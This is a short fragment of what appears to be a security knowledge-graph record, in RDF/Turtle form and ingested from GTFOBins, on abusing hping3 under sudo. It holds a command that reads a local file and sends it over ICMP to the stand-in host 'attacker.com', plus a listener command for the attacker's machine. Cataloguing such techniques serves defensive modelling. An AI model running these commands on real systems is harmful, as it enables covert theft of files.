    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description """The file is continuously sent, adjust the `--count` parameter or kill the sender when done. Receive on the attacker box with:

```
sudo hping3 --icmp --listen xxx --dump
```
""" ;
    d3f:uses mknd:executable_hping3 ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_hping3 ;
    mknd:provides mknd:function_sudo ;
    mknd:value """RHOST=attacker.com
LFILE=file_to_read
sudo hping3 "$RHOST" --icmp --data 500 --sign xxx --file "$LFILE"
""",
